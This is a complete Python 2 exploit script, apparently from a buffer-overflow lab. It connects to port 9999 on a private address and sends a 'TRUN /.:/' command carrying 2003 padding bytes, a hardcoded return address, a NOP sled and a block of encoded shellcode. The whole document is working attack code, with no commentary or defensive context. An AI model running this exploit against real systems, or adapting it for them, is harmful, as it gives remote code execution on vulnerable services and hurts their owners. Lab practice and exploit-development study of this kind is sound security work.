#!/usr/bin/python
import sys, socket

overflow = (
"\xdd\xc7\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x52\xbd\xc4\xf8\x9e"
"\x32\x31\x68\x17\x83\xc0\x04\x03\xac\xeb\x7c\xc7\xd0\xe4\x03"
"\x28\x28\xf5\x63\xa0\xcd\xc4\xa3\xd6\x86\x77\x14\x9c\xca\x7b"
"\xdf\xf0\xfe\x08\xad\xdc\xf1\xb9\x18\x3b\x3c\x39\x30\x7f\x5f"
"\xb9\x4b\xac\xbf\x80\x83\xa1\xbe\xc5\xfe\x48\x92\x9e\x75\xfe"
"\x02\xaa\xc0\xc3\xa9\xe0\xc5\x43\x4e\xb0\xe4\x62\xc1\xca\xbe"
"\xa4\xe0\x1f\xcb\xec\xfa\x7c\xf6\xa7\x71\xb6\x8c\x39\x53\x86"
"\x6d\x95\x9a\x26\x9c\xe7\xdb\x81\x7f\x92\x15\xf2\x02\xa5\xe2"
"\x88\xd8\x20\xf0\x2b\xaa\x93\xdc\xca\x7f\x45\x97\xc1\x34\x01"
"\xff\xc5\xcb\xc6\x74\xf1\x40\xe9\x5a\x73\x12\xce\x7e\xdf\xc0"
"\x6f\x27\x85\xa7\x90\x37\x66\x17\x35\x3c\x8b\x4c\x44\x1f\xc4"
"\xa1\x65\x9f\x14\xae\xfe\xec\x26\x71\x55\x7a\x0b\xfa\x73\x7d"
"\x6c\xd1\xc4\x11\x93\xda\x34\x38\x50\x8e\x64\x52\x71\xaf\xee"
"\xa2\x7e\x7a\xa0\xf2\xd0\xd5\x01\xa2\x90\x85\xe9\xa8\x1e\xf9"
"\x0a\xd3\xf4\x92\xa1\x2e\x9f\x96\x35\x32\x50\xcf\x37\x32\x7f"
"\x53\xb1\xd4\x15\x7b\x97\x4f\x82\xe2\xb2\x1b\x33\xea\x68\x66"
"\x73\x60\x9f\x97\x3a\x81\xea\x8b\xab\x61\xa1\xf1\x7a\x7d\x1f"
"\x9d\xe1\xec\xc4\x5d\x6f\x0d\x53\x0a\x38\xe3\xaa\xde\xd4\x5a"
"\x05\xfc\x24\x3a\x6e\x44\xf3\xff\x71\x45\x76\xbb\x55\x55\x4e"
"\x44\xd2\x01\x1e\x13\x8c\xff\xd8\xcd\x7e\xa9\xb2\xa2\x28\x3d"
"\x42\x89\xea\x3b\x4b\xc4\x9c\xa3\xfa\xb1\xd8\xdc\x33\x56\xed"
"\xa5\x29\xc6\x12\x7c\xea\xe6\xf0\x54\x07\x8f\xac\x3d\xaa\xd2"
"\x4e\xe8\xe9\xea\xcc\x18\x92\x08\xcc\x69\x97\x55\x4a\x82\xe5"
"\xc6\x3f\xa4\x5a\xe6\x15")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.0.2.5', 9999))
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "Error connecting the server"
	sys.exit()
